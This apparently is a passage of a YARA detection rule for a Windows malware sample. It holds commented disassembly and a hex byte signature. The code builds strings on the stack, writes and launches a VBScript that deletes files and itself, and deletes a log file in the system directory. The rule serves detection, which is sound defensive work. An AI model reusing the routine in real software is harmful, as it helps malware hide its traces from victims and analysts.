        .text:0x00406004  889c2443010000   mov byte [esp + 323],bl
        .text:0x0040600b  c684244401000000 mov byte [esp + 324],0
        .text:0x00406013  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00406015  6a00             push 0
        .text:0x00406017  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00406019  8d8424ac010000   lea eax,dword [esp + 428]
        .text:0x00406020  6804010000       push 260
        .text:0x00406025  50               push eax
        .text:0x00406026  6a00             push 0
        .text:0x00406028  ff1538914000     call dword [0x00409138]    ;kernel32.GetModuleFileNameA(0,local756,260)
        .text:0x0040602e  b10a             mov cl,10
        .text:0x00406030  b00d             mov al,13
        .text:0x00406032  6a00             push 0
        .text:0x00406034  c644247825       mov byte [esp + 120],37
        .text:0x00406039  c644247973       mov byte [esp + 121],115
        .text:0x0040603e  884c247a         mov byte [esp + 122],cl
        .text:0x00406042  8844247b         mov byte [esp + 123],al
        .text:0x00406046  c644247c25       mov byte [esp + 124],37
        .text:0x0040604b  c644247d73       mov byte [esp + 125],115
        .text:0x00406050  884c247e         mov byte [esp + 126],cl
        .text:0x00406054  8844247f         mov byte [esp + 127],al
        .text:0x00406058  c684248000000025 mov byte [esp + 128],37
        .text:0x00406060  c684248100000073 mov byte [esp + 129],115
        .text:0x00406068  888c2482000000   mov byte [esp + 130],cl
        .text:0x0040606f  88842483000000   mov byte [esp + 131],al
        .text:0x00406076  c684248400000025 mov byte [esp + 132],37
        .text:0x0040607e  c684248500000073 mov byte [esp + 133],115
        .text:0x00406086  888c2486000000   mov byte [esp + 134],cl
        .text:0x0040608d  88842487000000   mov byte [esp + 135],al
        .text:0x00406094  c684248800000025 mov byte [esp + 136],37
        .text:0x0040609c  c684248900000073 mov byte [esp + 137],115
        .text:0x004060a4  888c248a000000   mov byte [esp + 138],cl
        .text:0x004060ab  8884248b000000   mov byte [esp + 139],al
        .text:0x004060b2  c684248c00000025 mov byte [esp + 140],37
        .text:0x004060ba  c684248d00000073 mov byte [esp + 141],115
        .text:0x004060c2  c684248e00000025 mov byte [esp + 142],37
        .text:0x004060ca  c684248f00000073 mov byte [esp + 143],115
        .text:0x004060d2  c684249000000025 mov byte [esp + 144],37
        .text:0x004060da  c684249100000073 mov byte [esp + 145],115
        .text:0x004060e2  888c2492000000   mov byte [esp + 146],cl
        .text:0x004060e9  88842493000000   mov byte [esp + 147],al
        .text:0x004060f0  c684249400000025 mov byte [esp + 148],37
        .text:0x004060f8  c684249500000073 mov byte [esp + 149],115
        .text:0x00406100  c684249600000000 mov byte [esp + 150],0
        .text:0x00406108  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x0040610a  8d8c24f4000000   lea ecx,dword [esp + 244]
        .text:0x00406111  8d54241c         lea edx,dword [esp + 28]
        .text:0x00406115  51               push ecx
        .text:0x00406116  8d8424b0010000   lea eax,dword [esp + 432]
        .text:0x0040611d  52               push edx
        .text:0x0040611e  8d4c2450         lea ecx,dword [esp + 80]
        .text:0x00406122  50               push eax
        .text:0x00406123  8d542440         lea edx,dword [esp + 64]
        .text:0x00406127  51               push ecx
        .text:0x00406128  8d8424cc000000   lea eax,dword [esp + 204]
        .text:0x0040612f  52               push edx
        .text:0x00406130  8d8c24a8000000   lea ecx,dword [esp + 168]
        .text:0x00406137  50               push eax
        .text:0x00406138  8d542474         lea edx,dword [esp + 116]
        .text:0x0040613c  51               push ecx
        .text:0x0040613d  8d442430         lea eax,dword [esp + 48]
        .text:0x00406141  52               push edx
        .text:0x00406142  8d8c2494000000   lea ecx,dword [esp + 148]
        .text:0x00406149  50               push eax
        .text:0x0040614a  8d9424d0020000   lea edx,dword [esp + 720]
        .text:0x00406151  51               push ecx
        .text:0x00406152  52               push edx
        .text:0x00406153  e8681d0000       call 0x00407ec0    ;msvcrt.sprintf(local500,local1068)
        .text:0x00406158  83c42c           add esp,44
        .text:0x0040615b  6a00             push 0
        .text:0x0040615d  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x0040615f  6810270000       push 0x00002710
        .text:0x00406164  e8b70b0000       call 0x00406d20    ;sub_00406d20(0x00002710)
        .text:0x00406169  83c404           add esp,4
        .text:0x0040616c  8bf8             mov edi,eax
        .text:0x0040616e  c68424af01000000 mov byte [esp + 431],0
        .text:0x00406176  c644242825       mov byte [esp + 40],37
        .text:0x0040617b  6a00             push 0
        .text:0x0040617d  c644242d73       mov byte [esp + 45],115
        .text:0x00406182  c644242e25       mov byte [esp + 46],37
        .text:0x00406187  c644242f64       mov byte [esp + 47],100
        .text:0x0040618c  c64424302e       mov byte [esp + 48],46
        .text:0x00406191  c644243176       mov byte [esp + 49],118
        .text:0x00406196  c644243262       mov byte [esp + 50],98
        .text:0x0040619b  c644243373       mov byte [esp + 51],115
        .text:0x004061a0  c644243400       mov byte [esp + 52],0
        .text:0x004061a5  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004061a7  8d8424ac010000   lea eax,dword [esp + 428]
        .text:0x004061ae  57               push edi
        .text:0x004061af  8d4c242c         lea ecx,dword [esp + 44]
        .text:0x004061b3  50               push eax
        .text:0x004061b4  8d942450010000   lea edx,dword [esp + 336]
        .text:0x004061bb  51               push ecx
        .text:0x004061bc  52               push edx
        .text:0x004061bd  e8fe1c0000       call 0x00407ec0    ;msvcrt.sprintf(local856,local1144)
        .text:0x004061c2  83c410           add esp,16
        .text:0x004061c5  6a00             push 0
        .text:0x004061c7  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004061c9  6a00             push 0
        .text:0x004061cb  6a00             push 0
        .text:0x004061cd  6a02             push 2
        .text:0x004061cf  6a00             push 0
        .text:0x004061d1  6a00             push 0
        .text:0x004061d3  8d84245c010000   lea eax,dword [esp + 348]
        .text:0x004061da  6800000040       push 0x40000000
        .text:0x004061df  50               push eax
        .text:0x004061e0  ff15ac904000     call dword [0x004090ac]    ;kernel32.CreateFileA(local856,0x40000000,0,0,2,0,0)
        .text:0x004061e6  6a00             push 0
        .text:0x004061e8  8bf8             mov edi,eax
        .text:0x004061ea  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004061ec  8d8c2444010000   lea ecx,dword [esp + 324]
        .text:0x004061f3  6a00             push 0
        .text:0x004061f5  51               push ecx
        .text:0x004061f6  8d9424b4020000   lea edx,dword [esp + 692]
        .text:0x004061fd  68f4010000       push 500
        .text:0x00406202  52               push edx
        .text:0x00406203  57               push edi
        .text:0x00406204  ff15a4904000     call dword [0x004090a4]    ;kernel32.WriteFile(kernel32.CreateFileA(local856,0x40000000,0,0,2,0,0),local500,500,local860,0)
        .text:0x0040620a  6a00             push 0
        .text:0x0040620c  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x0040620e  57               push edi
        .text:0x0040620f  ff1588904000     call dword [0x00409088]    ;kernel32.CloseHandle(<0x004061e0>)
        .text:0x00406215  6a00             push 0
        .text:0x00406217  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00406219  6a00             push 0
        .text:0x0040621b  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x0040621d  c644240c6f       mov byte [esp + 12],111
        .text:0x00406222  c644240d70       mov byte [esp + 13],112
        .text:0x00406227  885c240e         mov byte [esp + 14],bl
        .text:0x0040622b  6a00             push 0
        .text:0x0040622d  c64424136e       mov byte [esp + 19],110
        .text:0x00406232  c644241400       mov byte [esp + 20],0
        .text:0x00406237  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00406239  6a00             push 0
        .text:0x0040623b  6a00             push 0
        .text:0x0040623d  8d842450010000   lea eax,dword [esp + 336]
        .text:0x00406244  6a00             push 0
        .text:0x00406246  8d4c2418         lea ecx,dword [esp + 24]
        .text:0x0040624a  50               push eax
        .text:0x0040624b  51               push ecx
        .text:0x0040624c  6a00             push 0
        .text:0x0040624e  ff15ac914000     call dword [0x004091ac]    ;shell32.ShellExecuteA(0,local1172,local856,0,0,0)
        .text:0x00406254  6a00             push 0
        .text:0x00406256  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00406258  6a00             push 0
        .text:0x0040625a  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x0040625c  6a00             push 0
        .text:0x0040625e  ff1510914000     call dword [0x00409110]    ;kernel32.ExitProcess(0)
        .text:0x00406264  5f               pop edi
        .text:0x00406265  5e               pop esi
        .text:0x00406266  5b               pop ebx
        .text:0x00406267  90               nop 
        .text:0x00406268  90               nop 
        .text:0x00406269  90               nop 
        .text:0x0040626a  90               nop 
        .text:0x0040626b  90               nop 
        .text:0x0040626c  90               nop 
        .text:0x0040626d  90               nop 
        .text:0x0040626e  90               nop 
        .text:0x0040626f  90               nop 
        .text:0x00406270  
        .text:0x00406270  FUNC: int cdecl sub_00406270( ) [2 XREFS] 
        .text:0x00406270  
        .text:0x00406270  Stack Variables: (offset from initial top of stack)
        .text:0x00406270          -260: int local260
        .text:0x00406270          -261: int local261
        .text:0x00406270          -262: int local262
        .text:0x00406270          -263: int local263
        .text:0x00406270          -264: int local264
        .text:0x00406270          -265: int local265
        .text:0x00406270          -266: int local266
        .text:0x00406270          -267: int local267
        .text:0x00406270          -268: int local268
        .text:0x00406270          -269: int local269
        .text:0x00406270          -270: int local270
        .text:0x00406270          -271: int local271
        .text:0x00406270          -272: int local272
        .text:0x00406270          -273: int local273
        .text:0x00406270          -274: int local274
        .text:0x00406270          -275: int local275
        .text:0x00406270          -276: int local276
        .text:0x00406270          -277: int local277
        .text:0x00406270          -278: int local278
        .text:0x00406270          -279: int local279
        .text:0x00406270          -280: int local280
        .text:0x00406270          -284: int local284
        .text:0x00406270          -285: int local285
        .text:0x00406270          -286: int local286
        .text:0x00406270          -287: int local287
        .text:0x00406270          -288: int local288
        .text:0x00406270          -289: int local289
        .text:0x00406270          -290: int local290
        .text:0x00406270          -291: int local291
        .text:0x00406270          -292: int local292
        .text:0x00406270          -293: int local293
        .text:0x00406270          -294: int local294
        .text:0x00406270          -295: int local295
        .text:0x00406270          -296: int local296
        .text:0x00406270          -297: int local297
        .text:0x00406270          -298: int local298
        .text:0x00406270          -299: int local299
        .text:0x00406270          -300: int local300
        .text:0x00406270          -301: int local301
        .text:0x00406270          -302: int local302
        .text:0x00406270          -303: int local303
        .text:0x00406270          -304: int local304
        .text:0x00406270          -305: int local305
        .text:0x00406270          -306: int local306
        .text:0x00406270          -307: int local307
        .text:0x00406270          -308: int local308
        .text:0x00406270  
        .text:0x00406270  81ec34010000     sub esp,308
        .text:0x00406276  b045             mov al,69
        .text:0x00406278  53               push ebx
        .text:0x00406279  56               push esi
        .text:0x0040627a  8b3578904000     mov esi,dword [0x00409078]
        .text:0x00406280  88442415         mov byte [esp + 21],al
        .text:0x00406284  88442418         mov byte [esp + 24],al
        .text:0x00406288  57               push edi
        .text:0x00406289  b065             mov al,101
        .text:0x0040628b  b374             mov bl,116
        .text:0x0040628d  b179             mov cl,121
        .text:0x0040628f  6a00             push 0
        .text:0x00406291  c644241c4b       mov byte [esp + 28],75
        .text:0x00406296  c644241e52       mov byte [esp + 30],82
        .text:0x0040629b  c644241f4e       mov byte [esp + 31],78
        .text:0x004062a0  c64424214c       mov byte [esp + 33],76
        .text:0x004062a5  c644242233       mov byte [esp + 34],51
        .text:0x004062aa  c644242332       mov byte [esp + 35],50
        .text:0x004062af  c64424242e       mov byte [esp + 36],46
        .text:0x004062b4  c644242564       mov byte [esp + 37],100
        .text:0x004062b9  c64424266c       mov byte [esp + 38],108
        .text:0x004062be  c64424276c       mov byte [esp + 39],108
        .text:0x004062c3  c644242800       mov byte [esp + 40],0
        .text:0x004062c8  c644242c47       mov byte [esp + 44],71
        .text:0x004062cd  8844242d         mov byte [esp + 45],al
        .text:0x004062d1  885c242e         mov byte [esp + 46],bl
        .text:0x004062d5  c644242f53       mov byte [esp + 47],83
        .text:0x004062da  884c2430         mov byte [esp + 48],cl
        .text:0x004062de  c644243173       mov byte [esp + 49],115
        .text:0x004062e3  885c2432         mov byte [esp + 50],bl
        .text:0x004062e7  88442433         mov byte [esp + 51],al
        .text:0x004062eb  c64424346d       mov byte [esp + 52],109
        .text:0x004062f0  c644243544       mov byte [esp + 53],68
        .text:0x004062f5  c644243669       mov byte [esp + 54],105
        .text:0x004062fa  c644243772       mov byte [esp + 55],114
        .text:0x004062ff  88442438         mov byte [esp + 56],al
        .text:0x00406303  c644243963       mov byte [esp + 57],99
        .text:0x00406308  885c243a         mov byte [esp + 58],bl
        .text:0x0040630c  c644243b6f       mov byte [esp + 59],111
        .text:0x00406311  c644243c72       mov byte [esp + 60],114
        .text:0x00406316  884c243d         mov byte [esp + 61],cl
        .text:0x0040631a  c644243e41       mov byte [esp + 62],65
        .text:0x0040631f  c644243f00       mov byte [esp + 63],0
        .text:0x00406324  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00406326  8d442428         lea eax,dword [esp + 40]
        .text:0x0040632a  8d4c2418         lea ecx,dword [esp + 24]
        .text:0x0040632e  50               push eax
        .text:0x0040632f  51               push ecx
        .text:0x00406330  ff15ec904000     call dword [0x004090ec]    ;kernel32.LoadLibraryA(local1472)
        .text:0x00406336  50               push eax
        .text:0x00406337  ff15e8904000     call dword [0x004090e8]    ;kernel32.GetProcAddress(kernel32,local1456)
        .text:0x0040633d  6a00             push 0
        .text:0x0040633f  8bf8             mov edi,eax
        .text:0x00406341  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00406343  8d54243c         lea edx,dword [esp + 60]
        .text:0x00406347  6804010000       push 260
        .text:0x0040634c  52               push edx
        .text:0x0040634d  ffd7             call edi    ;kernel32.GetSystemDirectoryA(local1436,260)
        .text:0x0040634f  6a00             push 0
        .text:0x00406351  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00406353  6a00             push 0
        .text:0x00406355  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00406357  6a00             push 0
        .text:0x00406359  c64424105c       mov byte [esp + 16],92
        .text:0x0040635e  c64424116f       mov byte [esp + 17],111
        .text:0x00406363  c644241275       mov byte [esp + 18],117
        .text:0x00406368  c644241372       mov byte [esp + 19],114
        .text:0x0040636d  c64424146c       mov byte [esp + 20],108
        .text:0x00406372  c64424156f       mov byte [esp + 21],111
        .text:0x00406377  c644241667       mov byte [esp + 22],103
        .text:0x0040637c  c64424172e       mov byte [esp + 23],46
        .text:0x00406381  c644241864       mov byte [esp + 24],100
        .text:0x00406386  c644241961       mov byte [esp + 25],97
        .text:0x0040638b  885c241a         mov byte [esp + 26],bl
        .text:0x0040638f  c644241b00       mov byte [esp + 27],0
        .text:0x00406394  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00406396  8d44240c         lea eax,dword [esp + 12]
        .text:0x0040639a  8d4c243c         lea ecx,dword [esp + 60]
        .text:0x0040639e  50               push eax
        .text:0x0040639f  51               push ecx
        .text:0x004063a0  ff15cc904000     call dword [0x004090cc]    ;kernel32.lstrcatA(local1436,local1484)
        .text:0x004063a6  6a00             push 0
        .text:0x004063a8  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004063aa  6a00             push 0
        .text:0x004063ac  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004063ae  8d54243c         lea edx,dword [esp + 60]
        .text:0x004063b2  52               push edx
        .text:0x004063b3  ff1518914000     call dword [0x00409118]    ;kernel32.DeleteFileA(local1436)
        .text:0x004063b9  6a00             push 0
        .text:0x004063bb  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004063bd  e85ef5ffff       call 0x00405920    ;sub_00405920()
        .text:0x004063c2  5f               pop edi
        .text:0x004063c3  5e               pop esi
        .text:0x004063c4  5b               pop ebx
        .text:0x004063c5  81c434010000     add esp,308
        .text:0x004063cb  c3               ret 
        */
        $c10 = { 81 EC 94 04 00 00 53 56 57 B9 18 00 00 00 33 C0 8D BC 24 ?? ?? ?? ?? C6 84 24 ?? ?? ?? ?? 00 C6 84 24 ?? ?? ?? ?? 00 F3 AB 66 AB AA B9 7C 00 00 00 33 C0 8D BC 24 ?? ?? ?? ?? C6 84 24 ?? ?? ?? ?? 00 F3 AB 66 AB AA B9 3F 00 00 00 33 C0 8D BC 24 ?? ?? ?? ?? B2 72 F3 AB 66 AB AA B3 65 B0 74 B1 63 C6 44 24 ?? 64 C6 44 24 ?? 69 C6 44 24 ?? 6D C6 44 24 ?? 20 C6 44 24 ?? 77 C6 44 24 ?? 73 C6 44 24 ?? 68 C6 44 24 ?? 00 C6 44 24 ?? 4F C6 44 24 ?? 6E C6 44 24 ?? 20 C6 44 24 ?? 45 88 54 24 ?? 88 54 24 ?? C6 44 24 ?? 6F 88 54 24 ?? C6 44 24 ?? 20 C6 44 24 ?? 52 88 5C 24 ?? C6 44 24 ?? 73 C6 44 24 ?? 75 C6 44 24 ?? 6D 88 5C 24 ?? C6 44 24 ?? 20 C6 44 24 ?? 4E 88 5C 24 ?? C6 44 24 ?? 78 88 44 24 ?? C6 44 24 ?? 00 C6 84 24 ?? ?? ?? ?? 73 88 9C 24 ?? ?? ?? ?? 88 84 24 ?? ?? ?? ?? C6 84 24 ?? ?? ?? ?? 20 C6 84 24 ?? ?? ?? ?? 77 C6 84 24 ?? ?? ?? ?? 73 C6 84 24 ?? ?? ?? ?? 68 C6 84 24 ?? ?? ?? ?? 3D 88 8C 24 ?? ?? ?? ?? 88 94 24 ?? ?? ?? ?? 88 9C 24 ?? ?? ?? ?? C6 84 24 ?? ?? ?? ?? 61 88 84 24 ?? ?? ?? ?? 88 9C 24 ?? ?? ?? ?? C6 84 24 ?? ?? ?? ?? 4F C6 84 24 ?? ?? ?? ?? 62 C6 84 24 ?? ?? ?? ?? 6A 88 9C 24 ?? ?? ?? ?? 88 8C 24 ?? ?? ?? ?? 88 84 24 ?? ?? ?? ?? C6 84 24 ?? ?? ?? ?? 28 C6 84 24 ?? ?? ?? ?? 22 C6 84 24 ?? ?? ?? ?? 57 C6 84 24 ?? ?? ?? ?? 53 88 8C 24 ?? ?? ?? ?? 88 94 24 ?? ?? ?? ?? C6 84 24 ?? ?? ?? ?? 69 C6 84 24 ?? ?? ?? ?? 70 88 84 24 ?? ?? ?? ?? C6 84 24 ?? ?? ?? ?? 2E C6 84 24 ?? ?? ?? ?? 53 C6 84 24 ?? ?? ?? ?? 68 88 9C 24 ?? ?? ?? ?? C6 84 24 ?? ?? ?? ?? 6C C6 84 24 ?? ?? ?? ?? 6C C6 84 24 ?? ?? ?? ?? 22 C6 84 24 ?? ?? ?? ?? 29 C6 84 24 ?? ?? ?? ?? 00 C6 84 24 ?? ?? ?? ?? 53 88 9C 24 ?? ?? ?? ?? 88 84 24 ?? ?? ?? ?? C6 84 24 ?? ?? ?? ?? 20 C6 84 24 ?? ?? ?? ?? 6F C6 84 24 ?? ?? ?? ?? 62 C6 84 24 ?? ?? ?? ?? 6A C6 84 24 ?? ?? ?? ?? 46 C6 84 24 ?? ?? ?? ?? 53 C6 84 24 ?? ?? ?? ?? 4F C6 84 24 ?? ?? ?? ?? 20 C6 84 24 ?? ?? ?? ?? 3D C6 84 24 ?? ?? ?? ?? 20 C6 84 24 ?? ?? ?? ?? 43 88 94 24 ?? ?? ?? ?? 88 9C 24 ?? ?? ?? ?? C6 84 24 ?? ?? ?? ?? 61 88 84 24 ?? ?? ?? ?? 88 9C 24 ?? ?? ?? ?? C6 84 24 ?? ?? ?? ?? 4F C6 84 24 ?? ?? ?? ?? 62 C6 84 24 ?? ?? ?? ?? 6A 88 9C 24 ?? ?? ?? ?? 88 8C 24 ?? ?? ?? ?? 88 84 24 ?? ?? ?? ?? C6 84 24 ?? ?? ?? ?? 28 C6 84 24 ?? ?? ?? ?? 22 C6 84 24 ?? ?? ?? ?? 53 88 8C 24 ?? ?? ?? ?? 88 94 24 ?? ?? ?? ?? C6 84 24 ?? ?? ?? ?? 69 C6 84 24 ?? ?? ?? ?? 70 88 84 24 ?? ?? ?? ?? C6 84 24 ?? ?? ?? ?? 69 C6 84 24 ?? ?? ?? ?? 6E C6 84 24 ?? ?? ?? ?? 67 C6 84 24 ?? ?? ?? ?? 2E C6 84 24 ?? ?? ?? ?? 46 C6 84 24 ?? ?? ?? ?? 69 C6 84 24 ?? ?? ?? ?? 6C 88 9C 24 ?? ?? ?? ?? C6 84 24 ?? ?? ?? ?? 53 C6 84 24 ?? ?? ?? ?? 79 C6 84 24 ?? ?? ?? ?? 73 88 84 24 ?? ?? ?? ?? 88 9C 24 ?? ?? ?? ?? C6 84 24 ?? ?? ?? ?? 6D C6 84 24 ?? ?? ?? ?? 4F C6 84 24 ?? ?? ?? ?? 62 C6 84 24 ?? ?? ?? ?? 6A 88 9C 24 ?? ?? ?? ?? 88 8C 24 ?? ?? ?? ?? 88 84 24 ?? ?? ?? ?? C6 84 24 ?? ?? ?? ?? 22 C6 84 24 ?? ?? ?? ?? 29 C6 84 24 ?? ?? ?? ?? 00 C6 44 24 ?? 77 C6 44 24 ?? 73 88 4C 24 ?? 88 54 24 ?? C6 44 24 ?? 69 C6 44 24 ?? 70 88 44 24 ?? C6 44 24 ?? 2E C6 44 24 ?? 73 C6 44 24 ?? 6C 88 5C 24 ?? 88 5C 24 ?? C6 44 24 ?? 70 C6 44 24 ?? 20 C6 44 24 ?? 31 C6 44 24 ?? 30 C6 44 24 ?? 30 C6 44 24 ?? 30 C6 44 24 ?? 00 C6 44 24 ?? 6F C6 44 24 ?? 62 C6 44 24 ?? 6A C6 44 24 ?? 46 C6 44 24 ?? 53 C6 44 24 ?? 4F C6 44 24 ?? 2E C6 44 24 ?? 44 88 5C 24 ?? C6 44 24 ?? 6C 88 5C 24 ?? 88 44 24 ?? 88 5C 24 ?? C6 44 24 ?? 46 C6 44 24 ?? 69 C6 44 24 ?? 6C 88 5C 24 ?? C6 44 24 ?? 28 C6 44 24 ?? 22 C6 44 24 ?? 00 C6 44 24 ?? 22 C6 44 24 ?? 29 C6 44 24 ?? 2C C6 44 24 ?? 20 C6 44 24 ?? 54 88 54 24 ?? C6 44 24 ?? 75 88 5C 24 ?? C6 44 24 ?? 00 88 8C 24 ?? ?? ?? ?? 88 94 24 ?? ?? ?? ?? 88 9C 24 ?? ?? ?? ?? C6 84 24 ?? ?? ?? ?? 61 88 84 24 ?? ?? ?? ?? 88 9C 24 ?? ?? ?? ?? C6 84 24 ?? ?? ?? ?? 6F C6 84 24 ?? ?? ?? ?? 62 C6 84 24 ?? ?? ?? ?? 6A 88 9C 24 ?? ?? ?? ?? 88 8C 24 ?? ?? ?? ?? 88 84 24 ?? ?? ?? ?? C6 84 24 ?? ?? ?? ?? 28 C6 84 24 ?? ?? ?? ?? 22 C6 84 24 ?? ?? ?? ?? 73 88 8C 24 ?? ?? ?? ?? 88 94 24 ?? ?? ?? ?? C6 84 24 ?? ?? ?? ?? 69 C6 84 24 ?? ?? ?? ?? 70 88 84 24 ?? ?? ?? ?? C6 84 24 ?? ?? ?? ?? 69 C6 84 24 ?? ?? ?? ?? 6E C6 84 24 ?? ?? ?? ?? 67 C6 84 24 ?? ?? ?? ?? 2E C6 84 24 ?? ?? ?? ?? 66 C6 84 24 ?? ?? ?? ?? 69 C6 84 24 ?? ?? ?? ?? 6C 88 9C 24 ?? ?? ?? ?? C6 84 24 ?? ?? ?? ?? 73 C6 84 24 ?? ?? ?? ?? 79 C6 84 24 ?? ?? ?? ?? 73 88 84 24 ?? ?? ?? ?? 88 9C 24 ?? ?? ?? ?? C6 84 24 ?? ?? ?? ?? 6D C6 84 24 ?? ?? ?? ?? 6F C6 84 24 ?? ?? ?? ?? 62 C6 84 24 ?? ?? ?? ?? 6A 88 9C 24 ?? ?? ?? ?? 88 8C 24 ?? ?? ?? ?? 88 84 24 ?? ?? ?? ?? C6 84 24 ?? ?? ?? ?? 22 C6 84 24 ?? ?? ?? ?? 29 C6 84 24 ?? ?? ?? ?? 2E C6 84 24 ?? ?? ?? ?? 64 8B 35 ?? ?? ?? ?? 6A 00 88 9C 24 ?? ?? ?? ?? C6 84 24 ?? ?? ?? ?? 6C 88 9C 24 ?? ?? ?? ?? 88 84 24 ?? ?? ?? ?? 88 9C 24 ?? ?? ?? ?? C6 84 24 ?? ?? ?? ?? 66 C6 84 24 ?? ?? ?? ?? 69 C6 84 24 ?? ?? ?? ?? 6C 88 9C 24 ?? ?? ?? ?? C6 84 24 ?? ?? ?? ?? 20 C6 84 24 ?? ?? ?? ?? 77 C6 84 24 ?? ?? ?? ?? 73 88 8C 24 ?? ?? ?? ?? 88 94 24 ?? ?? ?? ?? C6 84 24 ?? ?? ?? ?? 69 C6 84 24 ?? ?? ?? ?? 70 88 84 24 ?? ?? ?? ?? C6 84 24 ?? ?? ?? ?? 2E C6 84 24 ?? ?? ?? ?? 73 88 8C 24 ?? ?? ?? ?? 88 94 24 ?? ?? ?? ?? C6 84 24 ?? ?? ?? ?? 69 C6 84 24 ?? ?? ?? ?? 70 88 84 24 ?? ?? ?? ?? C6 84 24 ?? ?? ?? ?? 66 C6 84 24 ?? ?? ?? ?? 75 C6 84 24 ?? ?? ?? ?? 6C C6 84 24 ?? ?? ?? ?? 6C C6 84 24 ?? ?? ?? ?? 6E C6 84 24 ?? ?? ?? ?? 61 C6 84 24 ?? ?? ?? ?? 6D 88 9C 24 ?? ?? ?? ?? C6 84 24 ?? ?? ?? ?? 00 FF D6 6A 00 FF D6 8D 84 24 ?? ?? ?? ?? 68 04 01 00 00 50 6A 00 FF 15 ?? ?? ?? ?? B1 0A B0 0D 6A 00 C6 44 24 ?? 25 C6 44 24 ?? 73 88 4C 24 ?? 88 44 24 ?? C6 44 24 ?? 25 C6 44 24 ?? 73 88 4C 24 ?? 88 44 24 ?? C6 84 24 ?? ?? ?? ?? 25 C6 84 24 ?? ?? ?? ?? 73 88 8C 24 ?? ?? ?? ?? 88 84 24 ?? ?? ?? ?? C6 84 24 ?? ?? ?? ?? 25 C6 84 24 ?? ?? ?? ?? 73 88 8C 24 ?? ?? ?? ?? 88 84 24 ?? ?? ?? ?? C6 84 24 ?? ?? ?? ?? 25 C6 84 24 ?? ?? ?? ?? 73 88 8C 24 ?? ?? ?? ?? 88 84 24 ?? ?? ?? ?? C6 84 24 ?? ?? ?? ?? 25 C6 84 24 ?? ?? ?? ?? 73 C6 84 24 ?? ?? ?? ?? 25 C6 84 24 ?? ?? ?? ?? 73 C6 84 24 ?? ?? ?? ?? 25 C6 84 24 ?? ?? ?? ?? 73 88 8C 24 ?? ?? ?? ?? 88 84 24 ?? ?? ?? ?? C6 84 24 ?? ?? ?? ?? 25 C6 84 24 ?? ?? ?? ?? 73 C6 84 24 ?? ?? ?? ?? 00 FF D6 8D 8C 24 ?? ?? ?? ?? 8D 54 24 ?? 51 8D 84 24 ?? ?? ?? ?? 52 8D 4C 24 ?? 50 8D 54 24 ?? 51 8D 84 24 ?? ?? ?? ?? 52 8D 8C 24 ?? ?? ?? ?? 50 8D 54 24 ?? 51 8D 44 24 ?? 52 8D 8C 24 ?? ?? ?? ?? 50 8D 94 24 ?? ?? ?? ?? 51 52 E8 ?? ?? ?? ?? 83 C4 2C 6A 00 FF D6 68 10 27 00 00 E8 ?? ?? ?? ?? 83 C4 04 8B F8 C6 84 24 ?? ?? ?? ?? 00 C6 44 24 ?? 25 6A 00 C6 44 24 ?? 73 C6 44 24 ?? 25 C6 44 24 ?? 64 C6 44 24 ?? 2E C6 44 24 ?? 76 C6 44 24 ?? 62 C6 44 24 ?? 73 C6 44 24 ?? 00 FF D6 8D 84 24 ?? ?? ?? ?? 57 8D 4C 24 ?? 50 8D 94 24 ?? ?? ?? ?? 51 52 E8 ?? ?? ?? ?? 83 C4 10 6A 00 FF D6 6A 00 6A 00 6A 02 6A 00 6A 00 8D 84 24 ?? ?? ?? ?? 68 00 00 00 40 50 FF 15 ?? ?? ?? ?? 6A 00 8B F8 FF D6 8D 8C 24 ?? ?? ?? ?? 6A 00 51 8D 94 24 ?? ?? ?? ?? 68 F4 01 00 00 52 57 FF 15 ?? ?? ?? ?? 6A 00 FF D6 57 FF 15 ?? ?? ?? ?? 6A 00 FF D6 6A 00 FF D6 C6 44 24 ?? 6F C6 44 24 ?? 70 88 5C 24 ?? 6A 00 C6 44 24 ?? 6E C6 44 24 ?? 00 FF D6 6A 00 6A 00 8D 84 24 ?? ?? ?? ?? 6A 00 8D 4C 24 ?? 50 51 6A 00 FF 15 ?? ?? ?? ?? 6A 00 FF D6 6A 00 FF D6 6A 00 FF 15 ?? ?? ?? ?? 5F 5E 5B 90 90 90 90 90 90 90 90 90 81 EC 34 01 00 00 B0 45 53 56 8B 35 ?? ?? ?? ?? 88 44 24 ?? 88 44 24 ?? 57 B0 65 B3 74 B1 79 6A 00 C6 44 24 ?? 4B C6 44 24 ?? 52 C6 44 24 ?? 4E C6 44 24 ?? 4C C6 44 24 ?? 33 C6 44 24 ?? 32 C6 44 24 ?? 2E C6 44 24 ?? 64 C6 44 24 ?? 6C C6 44 24 ?? 6C C6 44 24 ?? 00 C6 44 24 ?? 47 88 44 24 ?? 88 5C 24 ?? C6 44 24 ?? 53 88 4C 24 ?? C6 44 24 ?? 73 88 5C 24 ?? 88 44 24 ?? C6 44 24 ?? 6D C6 44 24 ?? 44 C6 44 24 ?? 69 C6 44 24 ?? 72 88 44 24 ?? C6 44 24 ?? 63 88 5C 24 ?? C6 44 24 ?? 6F C6 44 24 ?? 72 88 4C 24 ?? C6 44 24 ?? 41 C6 44 24 ?? 00 FF D6 8D 44 24 ?? 8D 4C 24 ?? 50 51 FF 15 ?? ?? ?? ?? 50 FF 15 ?? ?? ?? ?? 6A 00 8B F8 FF D6 8D 54 24 ?? 68 04 01 00 00 52 FF D7 6A 00 FF D6 6A 00 FF D6 6A 00 C6 44 24 ?? 5C C6 44 24 ?? 6F C6 44 24 ?? 75 C6 44 24 ?? 72 C6 44 24 ?? 